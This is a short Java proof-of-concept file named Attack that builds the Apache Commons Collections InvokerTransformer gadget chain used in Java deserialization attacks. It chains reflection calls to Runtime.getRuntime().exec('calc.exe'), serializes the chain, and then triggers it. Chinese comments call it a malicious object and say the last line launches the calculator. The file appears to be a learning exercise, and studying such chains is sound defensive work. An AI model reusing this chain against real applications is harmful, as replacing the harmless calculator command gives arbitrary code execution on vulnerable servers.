package effect.serialize.leak;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

/**
 * @Author liu.teng
 * @Date 2020/8/11 19:32
 * @Version 1.0
 */
public class Attack {
    public static void main(String[] args) throws IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe",}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        //测试我们的恶意对象是否可以被序列化
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(transformerChain);

        //执行以下语句就可以调用起计算器
        transformerChain.transform(null);
    }
}
